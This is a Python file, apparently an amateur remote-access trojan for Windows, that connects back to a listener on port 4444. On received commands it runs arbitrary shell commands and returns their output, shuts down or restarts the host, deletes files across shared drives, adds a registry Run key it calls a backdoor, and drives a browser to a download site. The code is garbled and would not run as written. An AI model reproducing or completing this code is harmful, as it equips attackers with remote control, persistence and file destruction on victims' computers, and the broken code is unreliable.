from socket import *
import subprocess as sub
from winreg import *
import pyttsx3
from selenium import webdriver
import os
import time

s = socket(2,1)
s.connect(("127.0.0.1",4444))
print("Connected To Port")
print("______________________________")

def choice(data):
    if data == "1":
        
        def run(self):
            
            data1 = s.recv(102456).decode()
            self.cmd = sub.check_output(data1, shell=True).decode()
            s.send(str(self.cmd).encode())
            
obj = Shell ()
obj.get_cmd()
obj.run()

        
            
    elif data == "2":
         def run(self):
                    
             sef.sub.check_output("SHUTDOWN /S", shell=True)
objj = Logout()
objj.run()

    elif data == "1.2":
                def runn(self):
                    
                    sef.sub.check_output("SHUTDOWN /S /t 10", shell=True)

objjj = Logoutsecund(Logout)
objjj.runn()
    elif data == "2.2":
                def ruun(self):
                    
                    sef.sub.check_output("SHUTDOWN /r /t 10", shell=True)
obbj = Restart(Logout):
obbj.ruun()

    elif data =="3.2":
                def rrun(self):
                    
                    self.exit()
         
obbjj = Cansel(Logout):
obbjj.rrun()
        
         
    
     
    
    elif data == "3":
                def run(self):
            

                    self.drive = ["A:","B:","C:","D:","E:","F:","G:","H:","Z:","N:"]
                    sys_drive=[]
                    self.cmd = sub.check_output("net share", shell=True).decode()
                    
                    for i in drive:
                        if i in str(cmd):
                            sys_drive.append(i)

                    for i in sys_drive:
                        try:
                            self.sub.check_output("del /S "+i+"\\"+"*."+data, shell=True)
                            s.send("Win".encode())
                        except:
                            s.send("Lose".encode())



    elif data == "4":
                
                def run(self):
                
                    self.keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
                    try:
                        self.key = OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
                    except:
                        self.key = CreateKey(HKEY_CURRENT_USER,keyVal)

                    try:
                        self.SetValueEx(key,"notepad",0,REG_SZ,"C:\\Windows\\System32\\Notepad.exe")
                        CloseKey(key)
                        s.send("Backdoor is Working".encode())
                    except:
                        s.send("Backdoor is not Working(maybe shoud run as administartor OR ....)")

ob = Backdoor()
ob.run()

     elif data =="5":
         
          def run(self):
              
                path = os.path.dirname(os.path.abspath(__file__))
                address = os.path.join(path , "chromedriver.exe")

                driver = webdriver.Chrome(address)
                driver.get("https://soft98.ir")

                time.sleep(5)

                blog = driver.find_element_by_xpath('//*[@id="rso"]/div[1]/div/div/div/div/div/div[1]/a/h3/span')
                self.blog.click()
                time.sleep(3)
                article = driver.find_element_by_xpath('//*[@id="main"]/article[2]/footer/a')
                self.article.click()
                time.sleep(3)
                comment = driver.find_element_by_xpath('//*[@id="download-list"]/dd[3]/a')
                self.article.click()
                time.sleep(2)

objc = Download()
objc = run
       
data = s.recv(1024).decode()
choice(data)
           
